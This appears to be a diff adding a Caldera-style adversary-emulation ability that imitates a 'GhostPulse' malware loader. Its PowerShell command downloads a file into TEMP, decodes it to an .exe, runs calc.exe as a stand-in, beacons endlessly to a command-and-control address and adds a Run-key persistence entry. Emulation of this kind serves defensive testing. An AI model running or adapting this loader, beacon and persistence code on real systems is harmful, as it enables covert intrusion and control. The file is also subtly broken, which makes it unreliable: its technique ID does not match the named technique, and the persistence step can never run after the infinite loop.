@@ -1,0 +1,78 @@
+- tactic: command-and-control
+  technique_name: 'Application Layer Protocol: Web Protocols'
+  technique_id: T1070.001
+  name: GhostPulse malware payloader
+  description: ''
+  executors:
+  - name: psh
+    platform: windows
+    command: '$PayloadUrl = "https://github.com/tyungchan/caldera-addon/blob/main/malware/eicar.com"
+
+      $Header = @{
+
+      "UA-CPU" = "AMD64";
+
+      "X-GhostPulse" = "MalwareHeader";
+
+      "User-Agent" = "Mozilla/5.0 MalwareAgent"
+
+      }
+
+      $PayloadPath = "$env:TEMP\eicar.com"
+
+      Invoke-WebRequest -Uri $PayloadUrl -OutFile $PayloadPath
+
+
+      # Step 2: Simulate Decryption (Base64 decoding in this case)
+
+      $EncodedPayload = Get-Content $PayloadPath
+
+      $DecodedPayload = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($EncodedPayload))
+
+
+      # Step 3: Write the decoded payload to disk (for simulation purposes)
+
+      $DecodedPath = "$env:TEMP\decoded_payload.exe"
+
+      Set-Content -Path $DecodedPath -Value $DecodedPayload
+
+
+      # Step 4: Execute the payload (simulate with calc.exe)
+
+      Start-Process -FilePath "calc.exe"  # Replace with $DecodedPath for real payloads
+
+      While ($true) {
+
+      Invoke-WebRequest -Uri "http://198.18.128.192/beacon" -headers @{ "X-GhostPulse"
+      = "Beacon" } -Method GET
+
+      Start-Sleep -Seconds 60
+
+      }
+
+
+      # Step 5 (Optional): Add persistence
+
+      reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v PayloadLoader
+      /t REG_SZ /d $DecodedPath /f'
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets:
+  - command-and-control
+  additional_info: {}
+  access: {}
+  singleton: true
+  plugin: ''
+  delete_payload: true
+  id: 99edfe84-77fc-468d-9be1-70f7fb60a0af
